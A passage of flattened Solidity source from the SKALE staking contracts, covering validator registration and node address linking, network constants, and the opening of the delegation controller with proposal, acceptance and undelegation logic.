     uint validatorId\n\n    );\n\n\n\n    event ValidatorWasDisabled(\n\n        uint validatorId\n\n    );\n\n\n\n    /**\n\n     * @dev Emitted when a node address is linked to a validator.\n\n     */\n\n    event NodeAddressWasAdded(\n\n        uint validatorId,\n\n        address nodeAddress\n\n    );\n\n\n\n    /**\n\n     * @dev Emitted when a node address is unlinked from a validator.\n\n     */\n\n    event NodeAddressWasRemoved(\n\n        uint validatorId,\n\n        address nodeAddress\n\n    );\n\n\n\n    mapping (uint => Validator) public validators;\n\n    mapping (uint => bool) private _trustedValidators;\n\n    uint[] public trustedValidatorsList;\n\n    //       address => validatorId\n\n    mapping (address => uint) private _validatorAddressToId;\n\n    //       address => validatorId\n\n    mapping (address => uint) private _nodeAddressToValidatorId;\n\n    // validatorId => nodeAddress[]\n\n    mapping (uint => address[]) private _nodeAddresses;\n\n    uint public numberOfValidators;\n\n    bool public useWhitelist;\n\n\n\n    modifier checkValidatorExists(uint validatorId) {\n\n        require(validatorExists(validatorId), "Validator with such ID does not exist");\n\n        _;\n\n    }\n\n\n\n    /**\n\n     * @dev Creates a new validator Id.\n\n     *\n\n     * Requirements:\n\n     *\n\n     * - sender must not already have registered a validator Id.\n\n     * - fee rate must be between 0 - 1000¡ë. Note: per mille!\n\n     *\n\n     * Emits ValidatorRegistered event.\n\n     *\n\n     * @param name string\n\n     * @param description string\n\n     * @param feeRate uint Fee charged on delegations by the validator per mille\n\n     * @param minimumDelegationAmount uint Minimum delegation amount accepted by the validator\n\n     */\n\n    function registerValidator(\n\n        string calldata name,\n\n        string calldata description,\n\n        uint feeRate,\n\n        uint minimumDelegationAmount\n\n    )\n\n        external\n\n        returns (uint validatorId)\n\n    {\n\n        require(!validatorAddressExists(msg.sender), "Validator with such address already exists");\n\n        require(feeRate < 1000, "Fee rate of validator should be lower than 100%");\n\n        validatorId = ++numberOfValidators;\n\n        validators[validatorId] = Validator(\n\n            name,\n\n            msg.sender,\n\n            address(0),\n\n            description,\n\n            feeRate,\n\n            now,\n\n            minimumDelegationAmount,\n\n            true\n\n        );\n\n        _setValidatorAddress(validatorId, msg.sender);\n\n\n\n        emit ValidatorRegistered(validatorId);\n\n    }\n\n\n\n    function enableValidator(uint validatorId) external checkValidatorExists(validatorId) onlyAdmin {\n\n        require(!_trustedValidators[validatorId], "Validator is already enabled");\n\n        _trustedValidators[validatorId] = true;\n\n        trustedValidatorsList.push(validatorId);\n\n        emit ValidatorWasEnabled(validatorId);\n\n    }\n\n\n\n    function disableValidator(uint validatorId) external checkValidatorExists(validatorId) onlyAdmin {\n\n        require(_trustedValidators[validatorId], "Validator is already disabled");\n\n        _trustedValidators[validatorId] = false;\n\n        uint position = _find(trustedValidatorsList, validatorId);\n\n        if (position < trustedValidatorsList.length) {\n\n            trustedValidatorsList[position] =\n\n                trustedValidatorsList[trustedValidatorsList.length.sub(1)];\n\n        }\n\n        trustedValidatorsList.pop();\n\n        emit ValidatorWasDisabled(validatorId);\n\n    }\n\n\n\n    /**\n\n     * @dev Owner can disable the validator whitelist. Once turned off the\n\n     * whitelist cannot be re-enabled.\n\n     */\n\n    function disableWhitelist() external onlyOwner {\n\n        useWhitelist = false;\n\n    }\n\n\n\n    /**\n\n     * @dev Allows a validator to request a new address.\n\n     *\n\n     * Requirements:\n\n     *\n\n     * - new address must not be null\n\n     * - new address must not be already registered as a validator\n\n     *\n\n     * @param newValidatorAddress address\n\n     */\n\n    function requestForNewAddress(address newValidatorAddress) external {\n\n        require(newValidatorAddress != address(0), "New address cannot be null");\n\n        require(_validatorAddressToId[newValidatorAddress] == 0, "Address already registered");\n\n        // check Validator Exist inside getValidatorId\n\n        uint validatorId = getValidatorId(msg.sender);\n\n\n\n        validators[validatorId].requestedAddress = newValidatorAddress;\n\n    }\n\n\n\n    function confirmNewAddress(uint validatorId)\n\n        external\n\n        checkValidatorExists(validatorId)\n\n    {\n\n        require(\n\n            getValidator(validatorId).requestedAddress == msg.sender,\n\n            "The validator address cannot be changed because it is not the actual owner"\n\n        );\n\n        delete validators[validatorId].requestedAddress;\n\n        _setValidatorAddress(validatorId, msg.sender);\n\n\n\n        emit ValidatorAddressChanged(validatorId, validators[validatorId].validatorAddress);\n\n    }\n\n\n\n    /**\n\n     * @dev Links a given node address.\n\n     *\n\n     * Requirements:\n\n     *\n\n     * - the given signature must be valid.\n\n     * - the address must not be assigned to a validator.\n\n     *\n\n     * Emits NodeAddressWasAdded event.\n\n     *\n\n     * @param nodeAddress address\n\n     * @param sig bytes signature of validator Id by node operator.\n\n     */\n\n    function linkNodeAddress(address nodeAddress, bytes calldata sig) external {\n\n        // check Validator Exist inside getValidatorId\n\n        uint validatorId = getValidatorId(msg.sender);\n\n        require(\n\n            keccak256(abi.encodePacked(validatorId)).toEthSignedMessageHash().recover(sig) == nodeAddress,\n\n            "Signature is not pass"\n\n        );\n\n        require(_validatorAddressToId[nodeAddress] == 0, "Node address is a validator");\n\n\n\n        _addNodeAddress(validatorId, nodeAddress);\n\n        emit NodeAddressWasAdded(validatorId, nodeAddress);\n\n    }\n\n\n\n    /**\n\n     * @dev Unlinks a given node address from a validator.\n\n     *\n\n     * Emits NodeAddressWasRemoved event.\n\n     *\n\n     * @param nodeAddress address\n\n     */\n\n    function unlinkNodeAddress(address nodeAddress) external {\n\n        // check Validator Exist inside getValidatorId\n\n        uint validatorId = getValidatorId(msg.sender);\n\n\n\n        _removeNodeAddress(validatorId, nodeAddress);\n\n        emit NodeAddressWasRemoved(validatorId, nodeAddress);\n\n    }\n\n\n\n    function setValidatorMDA(uint minimumDelegationAmount) external {\n\n        // check Validator Exist inside getValidatorId\n\n        uint validatorId = getValidatorId(msg.sender);\n\n\n\n        validators[validatorId].minimumDelegationAmount = minimumDelegationAmount;\n\n    }\n\n\n\n    /**\n\n     * @dev Allows a validator to set a new validator name.\n\n     *\n\n     * @param newName string\n\n     */\n\n    function setValidatorName(string calldata newName) external {\n\n        // check Validator Exist inside getValidatorId\n\n        uint validatorId = getValidatorId(msg.sender);\n\n\n\n        validators[validatorId].name = newName;\n\n    }\n\n\n\n    /**\n\n     * @dev Allows a validator to set a new validator description.\n\n     *\n\n     * @param newDescription string\n\n     */\n\n    function setValidatorDescription(string calldata newDescription) external {\n\n        // check Validator Exist inside getValidatorId\n\n        uint validatorId = getValidatorId(msg.sender);\n\n\n\n        validators[validatorId].description = newDescription;\n\n    }\n\n\n\n    /**\n\n     * @dev Allows a validator to start accepting new delegation requests.\n\n     *\n\n     * Requirements:\n\n     *\n\n     * - validator must not have already enabled accepting new requests\n\n     */\n\n    function startAcceptingNewRequests() external {\n\n        // check Validator Exist inside getValidatorId\n\n        uint validatorId = getValidatorId(msg.sender);\n\n        require(!isAcceptingNewRequests(validatorId), "Accepting request is already enabled");\n\n\n\n        validators[validatorId].acceptNewRequests = true;\n\n    }\n\n\n\n    /**\n\n     * @dev Allows a validator to stop accepting new delegation requests.\n\n     *\n\n     * Requirements:\n\n     *\n\n     * - validator must not have already stopped accepting new requests\n\n     */\n\n    function stopAcceptingNewRequests() external {\n\n        // check Validator Exist inside getValidatorId\n\n        uint validatorId = getValidatorId(msg.sender);\n\n        require(isAcceptingNewRequests(validatorId), "Accepting request is already disabled");\n\n\n\n        validators[validatorId].acceptNewRequests = false;\n\n    }\n\n\n\n    /**\n\n     * @dev Returns the amount of validator bond.\n\n     *\n\n     * @param validatorId uint ID of validator to return the amount of locked funds\n\n     * @return bondAmount uint the amount of self-delegated funds by the validator\n\n    */\n\n    function getAndUpdateBondAmount(uint validatorId)\n\n        external\n\n        returns (uint)\n\n    {\n\n        DelegationController delegationController = DelegationController(\n\n            contractManager.getContract("DelegationController")\n\n        );\n\n        return delegationController.getAndUpdateDelegatedByHolderToValidatorNow(\n\n            getValidator(validatorId).validatorAddress,\n\n            validatorId\n\n        );\n\n    }\n\n\n\n    function getMyNodesAddresses() external view returns (address[] memory) {\n\n        return getNodeAddresses(getValidatorId(msg.sender));\n\n    }\n\n\n\n    /**\n\n     * @dev Returns a list of trusted validators.\n\n     *\n\n     * @return uint[] trusted validators\n\n     */\n\n    function getTrustedValidators() external view returns (uint[] memory) {\n\n        return trustedValidatorsList;\n\n    }\n\n\n\n    function checkMinimumDelegation(uint validatorId, uint amount)\n\n        external\n\n        view\n\n        checkValidatorExists(validatorId)\n\n        allow("DelegationController")\n\n        returns (bool)\n\n    {\n\n        return validators[validatorId].minimumDelegationAmount <= amount ? true : false;\n\n    }\n\n\n\n    function checkValidatorAddressToId(address validatorAddress, uint validatorId)\n\n        external\n\n        view\n\n        returns (bool)\n\n    {\n\n        return getValidatorId(validatorAddress) == validatorId ? true : false;\n\n    }\n\n\n\n    function getValidatorIdByNodeAddress(address nodeAddress) external view returns (uint validatorId) {\n\n        validatorId = _nodeAddressToValidatorId[nodeAddress];\n\n        require(validatorId != 0, "Node address is not assigned to a validator");\n\n    }\n\n\n\n\n\n    function isAuthorizedValidator(uint validatorId) external view checkValidatorExists(validatorId) returns (bool) {\n\n        return _trustedValidators[validatorId] || !useWhitelist;\n\n    }\n\n\n\n    function initialize(address contractManagerAddress) public override initializer {\n\n        Permissions.initialize(contractManagerAddress);\n\n        useWhitelist = true;\n\n    }\n\n\n\n    function getNodeAddresses(uint validatorId) public view returns (address[] memory) {\n\n        return _nodeAddresses[validatorId];\n\n    }\n\n\n\n    function validatorExists(uint validatorId) public view returns (bool) {\n\n        return validatorId <= numberOfValidators && validatorId != 0;\n\n    }\n\n\n\n    function validatorAddressExists(address validatorAddress) public view returns (bool) {\n\n        return _validatorAddressToId[validatorAddress] != 0;\n\n    }\n\n\n\n    function checkIfValidatorAddressExists(address validatorAddress) public view {\n\n        require(validatorAddressExists(validatorAddress), "Validator with given address does not exist");\n\n    }\n\n\n\n    function getValidator(uint validatorId) public view checkValidatorExists(validatorId) returns (Validator memory) {\n\n        return validators[validatorId];\n\n    }\n\n\n\n    function getValidatorId(address validatorAddress) public view returns (uint) {\n\n        checkIfValidatorAddressExists(validatorAddress);\n\n        return _validatorAddressToId[validatorAddress];\n\n    }\n\n\n\n    function isAcceptingNewRequests(uint validatorId) public view checkValidatorExists(validatorId) returns (bool) {\n\n        return validators[validatorId].acceptNewRequests;\n\n    }\n\n\n\n    // private\n\n    function _setValidatorAddress(uint validatorId, address validatorAddress) private {\n\n        if (_validatorAddressToId[validatorAddress] == validatorId) {\n\n            return;\n\n        }\n\n        require(_validatorAddressToId[validatorAddress] == 0, "Address is in use by another validator");\n\n        address oldAddress = validators[validatorId].validatorAddress;\n\n        delete _validatorAddressToId[oldAddress];\n\n        _nodeAddressToValidatorId[validatorAddress] = validatorId;\n\n        validators[validatorId].validatorAddress = validatorAddress;\n\n        _validatorAddressToId[validatorAddress] = validatorId;\n\n    }\n\n\n\n    function _addNodeAddress(uint validatorId, address nodeAddress) private {\n\n        if (_nodeAddressToValidatorId[nodeAddress] == validatorId) {\n\n            return;\n\n        }\n\n        require(_nodeAddressToValidatorId[nodeAddress] == 0, "Validator cannot override node address");\n\n        _nodeAddressToValidatorId[nodeAddress] = validatorId;\n\n        _nodeAddresses[validatorId].push(nodeAddress);\n\n    }\n\n\n\n    function _removeNodeAddress(uint validatorId, address nodeAddress) private {\n\n        require(_nodeAddressToValidatorId[nodeAddress] == validatorId,\n\n            "Validator does not have permissions to unlink node");\n\n        delete _nodeAddressToValidatorId[nodeAddress];\n\n        for (uint i = 0; i < _nodeAddresses[validatorId].length; ++i) {\n\n            if (_nodeAddresses[validatorId][i] == nodeAddress) {\n\n                if (i + 1 < _nodeAddresses[validatorId].length) {\n\n                    _nodeAddresses[validatorId][i] =\n\n                        _nodeAddresses[validatorId][_nodeAddresses[validatorId].length.sub(1)];\n\n                }\n\n                delete _nodeAddresses[validatorId][_nodeAddresses[validatorId].length.sub(1)];\n\n                _nodeAddresses[validatorId].pop();\n\n                break;\n\n            }\n\n        }\n\n    }\n\n\n\n    function _find(uint[] memory array, uint index) private pure returns (uint) {\n\n        uint i;\n\n        for (i = 0; i < array.length; i++) {\n\n            if (array[i] == index) {\n\n                return i;\n\n            }\n\n        }\n\n        return array.length;\n\n    }\n\n}\n\n\n\ncontract ConstantsHolder is Permissions {\n\n\n\n    // initial price for creating Node (100 SKL)\n\n    uint public constant NODE_DEPOSIT = 100 * 1e18;\n\n\n\n    uint8 public constant TOTAL_SPACE_ON_NODE = 128;\n\n\n\n    // part of Node for Small Skale-chain (1/128 of Node)\n\n    uint8 public constant SMALL_DIVISOR = 128;\n\n\n\n    // part of Node for Medium Skale-chain (1/8 of Node)\n\n    uint8 public constant MEDIUM_DIVISOR = 8;\n\n\n\n    // part of Node for Large Skale-chain (full Node)\n\n    uint8 public constant LARGE_DIVISOR = 1;\n\n\n\n    // part of Node for Medium Test Skale-chain (1/4 of Node)\n\n    uint8 public constant MEDIUM_TEST_DIVISOR = 4;\n\n\n\n    // typically number of Nodes for Skale-chain (16 Nodes)\n\n    uint public constant NUMBER_OF_NODES_FOR_SCHAIN = 16;\n\n\n\n    // number of Nodes for Test Skale-chain (2 Nodes)\n\n    uint public constant NUMBER_OF_NODES_FOR_TEST_SCHAIN = 2;\n\n\n\n    // number of Nodes for Test Skale-chain (4 Nodes)\n\n    uint public constant NUMBER_OF_NODES_FOR_MEDIUM_TEST_SCHAIN = 4;    \n\n\n\n    // number of seconds in one year\n\n    uint32 public constant SECONDS_TO_YEAR = 31622400;\n\n\n\n    // initial number of monitors\n\n    uint public constant NUMBER_OF_MONITORS = 24;\n\n\n\n    uint public constant OPTIMAL_LOAD_PERCENTAGE = 80;\n\n\n\n    uint public constant ADJUSTMENT_SPEED = 1000;\n\n\n\n    uint public constant COOLDOWN_TIME = 60;\n\n\n\n    uint public constant MIN_PRICE = 10**6;\n\n\n\n    uint public constant MSR_REDUCING_COEFFICIENT = 2;\n\n\n\n    uint public constant DOWNTIME_THRESHOLD_PART = 30;\n\n\n\n    uint public constant BOUNTY_LOCKUP_MONTHS = 3;\n\n\n\n    // MSR - Minimum staking requirement\n\n    uint public msr;\n\n\n\n    // Reward period - 30 days (each 30 days Node would be granted for bounty)\n\n    uint32 public rewardPeriod;\n\n\n\n    // Allowable latency - 150000 ms by default\n\n    uint32 public allowableLatency;\n\n\n\n    /**\n\n     * Delta period - 1 hour (1 hour before Reward period became Monitors need\n\n     * to send Verdicts and 1 hour after Reward period became Node need to come\n\n     * and get Bounty)\n\n     */\n\n    uint32 public deltaPeriod;\n\n\n\n    /**\n\n     * Check time - 2 minutes (every 2 minutes monitors should check metrics\n\n     * from checked nodes)\n\n     */\n\n    uint public checkTime;\n\n\n\n    //Need to add minimal allowed parameters for verdicts\n\n\n\n    uint public launchTimestamp;\n\n\n\n    uint public rotationDelay;\n\n\n\n    uint public proofOfUseLockUpPeriodDays;\n\n\n\n    uint public proofOfUseDelegationPercentage;\n\n\n\n    /**\n\n     * Set reward and delta periods to new one, run only by owner. This function\n\n     * only for tests.\n\n     * @param newRewardPeriod - new Reward period\n\n     * @param newDeltaPeriod - new Delta period\n\n     */\n\n    function setPeriods(uint32 newRewardPeriod, uint32 newDeltaPeriod) external onlyOwner {\n\n        require(\n\n            newRewardPeriod >= newDeltaPeriod && newRewardPeriod - newDeltaPeriod >= checkTime,\n\n            "Incorrect Periods"\n\n        );\n\n        rewardPeriod = newRewardPeriod;\n\n        deltaPeriod = newDeltaPeriod;\n\n    }\n\n\n\n    /**\n\n     * Set new check time. This function only for tests.\n\n     * @param newCheckTime - new check time\n\n     */\n\n    function setCheckTime(uint newCheckTime) external onlyOwner {\n\n        require(rewardPeriod - deltaPeriod >= checkTime, "Incorrect check time");\n\n        checkTime = newCheckTime;\n\n    }    \n\n\n\n    /**\n\n     * Set latency new one in ms, run only by owner. This function\n\n     * only for tests.\n\n     * @param newAllowableLatency - new Allowable Latency\n\n     */\n\n    function setLatency(uint32 newAllowableLatency) external onlyOwner {\n\n        allowableLatency = newAllowableLatency;\n\n    }\n\n\n\n    function setMSR(uint newMSR) external onlyOwner {\n\n        msr = newMSR;\n\n    }\n\n\n\n    function setLaunchTimestamp(uint timestamp) external onlyOwner {\n\n        require(now < launchTimestamp, "Can\'t set network launch timestamp because network is already launched");\n\n        launchTimestamp = timestamp;\n\n    }\n\n\n\n    function setRotationDelay(uint newDelay) external onlyOwner {\n\n        rotationDelay = newDelay;\n\n    }\n\n\n\n    function setProofOfUseLockUpPeriod(uint periodDays) external onlyOwner {\n\n        proofOfUseLockUpPeriodDays = periodDays;\n\n    }\n\n\n\n    function setProofOfUseDelegationPercentage(uint percentage) external onlyOwner {\n\n        require(percentage <= 100, "Percentage value is incorrect");\n\n        proofOfUseDelegationPercentage = percentage;\n\n    }\n\n\n\n    /**\n\n     * @dev constructor in Permissions approach\n\n     * @param contractsAddress needed in Permissions constructor\n\n     */\n\n    function initialize(address contractsAddress) public override initializer {\n\n        Permissions.initialize(contractsAddress);\n\n\n\n        msr = 0;\n\n        rewardPeriod = 86400;\n\n        allowableLatency = 150000;\n\n        deltaPeriod = 3600;\n\n        checkTime = 300;\n\n        launchTimestamp = uint(-1);\n\n        rotationDelay = 12 hours;\n\n        proofOfUseLockUpPeriodDays = 90;\n\n        proofOfUseDelegationPercentage = 50;\n\n    }\n\n}\n\ncontract DelegationController is Permissions, ILocker {\n\n    using MathUtils for uint;\n\n    using PartialDifferences for PartialDifferences.Sequence;\n\n    using PartialDifferences for PartialDifferences.Value;\n\n    using FractionUtils for FractionUtils.Fraction;\n\n\n\n    enum State {\n\n        PROPOSED,\n\n        ACCEPTED,\n\n        CANCELED,\n\n        REJECTED,\n\n        DELEGATED,\n\n        UNDELEGATION_REQUESTED,\n\n        COMPLETED\n\n    }\n\n\n\n    struct Delegation {\n\n        address holder; // address of token owner\n\n        uint validatorId;\n\n        uint amount;\n\n        uint delegationPeriod;\n\n        uint created; // time of delegation creation\n\n        uint started; // month when a delegation becomes active\n\n        uint finished; // first month after a delegation ends\n\n        string info;\n\n    }\n\n\n\n    struct SlashingLogEvent {\n\n        FractionUtils.Fraction reducingCoefficient;\n\n        uint nextMonth;\n\n    }\n\n\n\n    struct SlashingLog {\n\n        //      month => slashing event\n\n        mapping (uint => SlashingLogEvent) slashes;\n\n        uint firstMonth;\n\n        uint lastMonth;\n\n    }\n\n\n\n    struct DelegationExtras {\n\n        uint lastSlashingMonthBeforeDelegation;\n\n    }\n\n\n\n    struct SlashingEvent {\n\n        FractionUtils.Fraction reducingCoefficient;\n\n        uint validatorId;\n\n        uint month;\n\n    }\n\n\n\n    struct SlashingSignal {\n\n        address holder;\n\n        uint penalty;\n\n    }\n\n\n\n    struct LockedInPending {\n\n        uint amount;\n\n        uint month;\n\n    }\n\n\n\n    struct FirstDelegationMonth {\n\n        // month\n\n        uint value;\n\n        //validatorId => month\n\n        mapping (uint => uint) byValidator;\n\n    }\n\n\n\n    /**\n\n     * @dev Emitted when a delegation is proposed to a validator.\n\n     */\n\n    event DelegationProposed(\n\n        uint delegationId\n\n    );\n\n\n\n    /**\n\n     * @dev Emitted when a delegation is accepted by a validator.\n\n     */\n\n    event DelegationAccepted(\n\n        uint delegationId\n\n    );\n\n\n\n    /**\n\n     * @dev Emitted when a delegation is cancelled by the delegator.\n\n     */\n\n    event DelegationRequestCanceledByUser(\n\n        uint delegationId\n\n    );\n\n\n\n    /**\n\n     * @dev Emitted when a delegation is requested to undelegate.\n\n     */\n\n    event UndelegationRequested(\n\n        uint delegationId\n\n    );\n\n\n\n    /// @dev delegations will never be deleted to index in this array may be used like delegation id\n\n    Delegation[] public delegations;\n\n\n\n    // validatorId => delegationId[]\n\n    mapping (uint => uint[]) public delegationsByValidator;\n\n\n\n    //        holder => delegationId[]\n\n    mapping (address => uint[]) public delegationsByHolder;\n\n\n\n    // delegationId => extras\n\n    mapping(uint => DelegationExtras) private _delegationExtras;\n\n\n\n    // validatorId => sequence\n\n    mapping (uint => PartialDifferences.Value) private _delegatedToValidator;\n\n    // validatorId => sequence\n\n    mapping (uint => PartialDifferences.Sequence) private _effectiveDelegatedToValidator;\n\n\n\n    // validatorId => slashing log\n\n    mapping (uint => SlashingLog) private _slashesOfValidator;\n\n\n\n    //        holder => sequence\n\n    mapping (address => PartialDifferences.Value) private _delegatedByHolder;\n\n    //        holder =>   validatorId => sequence\n\n    mapping (address => mapping (uint => PartialDifferences.Value)) private _delegatedByHolderToValidator;\n\n    //        holder =>   validatorId => sequence\n\n    mapping (address => mapping (uint => PartialDifferences.Sequence)) private _effectiveDelegatedByHolderToValidator;\n\n\n\n    SlashingEvent[] private _slashes;\n\n    //        holder => index in _slashes;\n\n    mapping (address => uint) private _firstUnprocessedSlashByHolder;\n\n\n\n    //        holder =>   validatorId => month\n\n    mapping (address => FirstDelegationMonth) private _firstDelegationMonth;\n\n\n\n    //        holder => locked in pending\n\n    mapping (address => LockedInPending) private _lockedInPendingDelegations;\n\n\n\n    /**\n\n     * @dev Modifier to make a function callable only if delegation exists.\n\n     */\n\n    modifier checkDelegationExists(uint delegationId) {\n\n        require(delegationId < delegations.length, "Delegation does not exist");\n\n        _;\n\n    }\n\n\n\n    function getAndUpdateDelegatedToValidatorNow(uint validatorId) external returns (uint) {\n\n        return getAndUpdateDelegatedToValidator(validatorId, _getCurrentMonth());\n\n    }\n\n\n\n    function getAndUpdateDelegatedAmount(address holder) external returns (uint) {\n\n        return _getAndUpdateDelegatedByHolder(holder);\n\n    }\n\n\n\n    function getAndUpdateEffectiveDelegatedByHolderToValidator(address holder, uint validatorId, uint month) external\n\n        allow("Distributor") returns (uint effectiveDelegated)\n\n    {\n\n        SlashingSignal[] memory slashingSignals = _processAllSlashesWithoutSignals(holder);\n\n        effectiveDelegated = _effectiveDelegatedByHolderToValidator[holder][validatorId]\n\n            .getAndUpdateValueInSequence(month);\n\n        _sendSlashingSignals(slashingSignals);\n\n    }\n\n\n\n    /**\n\n     * @dev Allows a token holder to create a delegation proposal of an `amount`\n\n     * and `delegationPeriod` to a `validatorId`. Delegation must be accepted\n\n     * by the validator before the UTC start of the month, otherwise the\n\n     * delegation will be rejected.\n\n     *\n\n     * The token holder may add additional information in each proposal.\n\n     *\n\n     * @param validatorId uint ID of validator to receive delegation proposal\n\n     * @param amount uint amount of proposed delegation\n\n     * @param delegationPeriod uint period of proposed delegation\n\n     * @param info string extra information provided by the token holder (if any)\n\n     */\n\n    function delegate(\n\n        uint validatorId,\n\n        uint amount,\n\n        uint delegationPeriod,\n\n        string calldata info\n\n    )\n\n        external\n\n    {\n\n\n\n        ValidatorService validatorService = ValidatorService(contractManager.getContract("ValidatorService"));\n\n        DelegationPeriodManager delegationPeriodManager = DelegationPeriodManager(\n\n            contractManager.getContract("DelegationPeriodManager"));\n\n        SkaleToken skaleToken = SkaleToken(contractManager.getContract("SkaleToken"));\n\n        TokenState tokenState = TokenState(contractManager.getContract("TokenState"));\n\n\n\n        require(\n\n            validatorService.checkMinimumDelegation(validatorId, amount),\n\n            "Amount does not meet the validator\'s minimum delegation amount");\n\n        require(\n\n            validatorService.isAuthorizedValidator(validatorId),\n\n            "Validator is not authorized to accept delegation request");\n\n        require(\n\n            delegationPeriodManager.isDelegationPeriodAllowed(delegationPeriod),\n\n            "This delegation period is not allowed");\n\n        require(\n\n            validatorService.isAcceptingNewRequests(validatorId),\n\n            "The validator is not currently accepting new requests");\n\n\n\n        SlashingSignal[] memory slashingSignals = _processAllSlashesWithoutSignals(msg.sender);\n\n\n\n        uint delegationId = _addDelegation(\n\n            msg.sender,\n\n            validatorId,\n\n            amount,\n\n            delegationPeriod,\n\n            info);\n\n\n\n        // check that there is enough money\n\n        uint holderBalance = skaleToken.balanceOf(msg.sender);\n\n        uint forbiddenForDelegation = tokenState.getAndUpdateForbiddenForDelegationAmount(msg.sender);\n\n        require(holderBalance >= forbiddenForDelegation, "Token holder does not have enough tokens to delegate");\n\n\n\n        emit DelegationProposed(delegationId);\n\n\n\n        _sendSlashingSignals(slashingSignals);\n\n    }\n\n\n\n    /**\n\n     * @dev See ILocker.\n\n     */\n\n    function getAndUpdateLockedAmount(address wallet) external override returns (uint) {\n\n        return _getAndUpdateLockedAmount(wallet);\n\n    }\n\n\n\n    /**\n\n     * @dev See ILocker.\n\n     */\n\n    function getAndUpdateForbiddenForDelegationAmount(address wallet) external override returns (uint) {\n\n        return _getAndUpdateLockedAmount(wallet);\n\n    }\n\n\n\n    /**\n\n     * @dev Allows a token holder to cancel a delegation proposal.\n\n     *\n\n     * Requirements:\n\n     *\n\n     * - the sender must be the token holder of the delegation proposal.\n\n     * - the delegation must still be in a PROPOSED state.\n\n     *\n\n     * Emits a DelegationRequestCanceledByUser event.\n\n     *\n\n     * @param delegationId uint ID of delegation proposal\n\n     */\n\n    function cancelPendingDelegation(uint delegationId) external checkDelegationExists(delegationId) {\n\n        require(msg.sender == delegations[delegationId].holder, "Only token holders can cancel delegation request");\n\n        require(getState(delegationId) == State.PROPOSED, "Token holders are only able to cancel PROPOSED delegations");\n\n\n\n        delegations[delegationId].finished = _getCurrentMonth();\n\n        _subtractFromLockedInPendingDelegations(delegations[delegationId].holder, delegations[delegationId].amount);\n\n\n\n        emit DelegationRequestCanceledByUser(delegationId);\n\n    }\n\n\n\n    /**\n\n     * @dev Allows a validator to accept a proposed delegation.\n\n     * Successful acceptance of delegations transition the tokens from a\n\n     * PROPOSED state to ACCEPTED, and tokens are locked for the remainder of the\n\n     * delegation period.\n\n     *\n\n     * Emits a DelegationAccepted event.\n\n     *\n\n     * @param delegationId uint ID of delegation proposal\n\n     */\n\n    function acceptPendingDelegation(uint delegationId) external checkDelegationExists(delegationId) {\n\n        ValidatorService validatorService = ValidatorService(contractManager.getContract("ValidatorService"));\n\n        require(\n\n            validatorService.checkValidatorAddressToId(msg.sender, delegations[delegationId].validatorId),\n\n            "No permissions to accept request");\n\n        \n\n        State currentState = getState(delegationId);\n\n        if (currentState != State.PROPOSED) {\n\n            if (currentState == State.ACCEPTED ||\n\n                currentState == State.DELEGATED ||\n\n                currentState == State.UNDELEGATION_REQUESTED ||\n\n                currentState == State.COMPLETED)\n\n            {\n\n                revert("The delegation has been already accepted");\n\n            } else if (currentState == State.CANCELED) {\n\n                revert("The delegation has been cancelled by token holder");\n\n            } else if (currentState == State.REJECTED) {\n\n                revert("The delegation request is outdated");\n\n            }\n\n        }\n\n        require(currentState == State.PROPOSED, "Cannot set delegation state to accepted");\n\n        \n\n        TokenLaunchLocker tokenLaunchLocker = TokenLaunchLocker(contractManager.getContract("TokenLaunchLocker"));\n\n\n\n        SlashingSignal[] memory slashingSignals = _processAllSlashesWithoutSignals(delegations[delegationId].holder);\n\n\n\n        _addToAllStatistics(delegationId);\n\n\n\n        tokenLaunchLocker.handleDelegationAdd(\n\n            delegations[delegationId].holder,\n\n            delegationId,\n\n            delegations[delegationId].amount,\n\n            delegations[delegationId].started);\n\n\n\n        _sendSlashingSignals(slashingSignals);\n\n\n\n        emit DelegationAccepted(delegationId);\n\n    }\n\n\n\n    /**\n\n     * @dev Allows a delegator to undelegate a specific delegation.\n\n     *\n\n     * Requirements:\n\n     *\n\n     * - the sender must be the delegator.\n\n     * - the delegation must be in DELEGATED state.\n\n     *\n\n     * Emits an UndelegationRequested event.\n\n     *\n\n     * @param delegationId uint ID of delegation to undelegate\n\n     */\n\n    function requestUndelegation(uint delegationId) external checkDelegationExists(delegationId) {\n\n        require(getState(delegationId) == State.DELEGATED, "Cannot request undelegation");\n\n\n\n        ValidatorService validatorService = ValidatorService(contractManager.getContract("ValidatorService"));\n\n        require(\n\n            delegations[delegationId].holder == msg.sender ||\n\n            (validatorService.validatorAddressExists(msg.sender) &&\n\n            delegations[delegationId].validatorId == validatorService.getValidatorId(msg.sender)),\n\n            "Permission denied to request undelegation");\n\n\n\n        TokenLaunchLocker tokenLaunchLocker = TokenLaunchLocker(contractManager.getContract("TokenLaunchLocker"));\n\n        DelegationPeriodManager delegationPeriodManager = DelegationPeriodManager(\n\n            contractManager.getContract("DelegationPeriodManager"));\n\n\n\n        processAllSlashes(msg.sender);\n\n        delegations[delegationId].finished = _calculateDelegationEndMonth(delegationId);\n\n        uint amountAfterSlashing = _calculateDelegationAmountAfterSlashing(delegationId);\n\n\n\n        _removeFromDelegatedToValidator(\n\n            delegations[delegationId].validatorId,\n\n            amountAfterSlashing,\n\n            delegations[delegationId].finished);\n\n        _removeFromDelegatedByHolder(\n\n            delegations[delegationId].holder,\n\n            amountAfterSlashing,\n\n            delegations[delegationId].finished);\n\n        _removeFromDelegatedByHolderToValidator(\n\n            delegations[delegationId].holder,\n\n            delegations[delegationId].validatorId,\n\n            amountAfterSlashing,\n\n            delegations[delegationId].finished);\n\n        uint effectiveAmount = amountAfterSlashing.mul(delegationPeriodManager.stakeMultipliers(\n\n            delegations[delegationId].delegationPeriod));\n\n        _removeFromEffectiveDelegatedToValidator(\n\n            delegations[delegationId].validatorId,\n\n            effectiveAmount,\n\n            delegations[delegationId].finished);\n\n        _removeFromEffectiveDelegatedByHolderToValidator(\n\n            delegations[delegationId].holder,\n\n            delegations[delegationId].validatorId,\n\n            effectiveAmount,\n\n            delegations[delegationId].finished);\n\n\n\n        tokenLaunchLocker.handleDelegationRemoving(\n\n            delegations[delegationId].holder,\n\n            delegationId,\n\n            delegations[delegationId].finished);\n\n\n\n        emit UndelegationRequested(delegationId);\n\n    }\n\n\n\n    /**\n\n     * @dev Allows the Punisher to confiscate an `amount` of stake from\n\n     * `validatorId` by slashing. This slashes all delegations of the validator,\n\n     * which reduces the amount that the validator has staked. This consequence\n\n     * may force the SKALE Manger to reduce the number of nodes a validator is\n\n     * operating so the validator can meet the Minimum Staking Requirement.\n\n     *\n\n     * See Punisher.\n\n     *\n\n     * Emits a SlashingEvent.\n\n     *\n\n     * 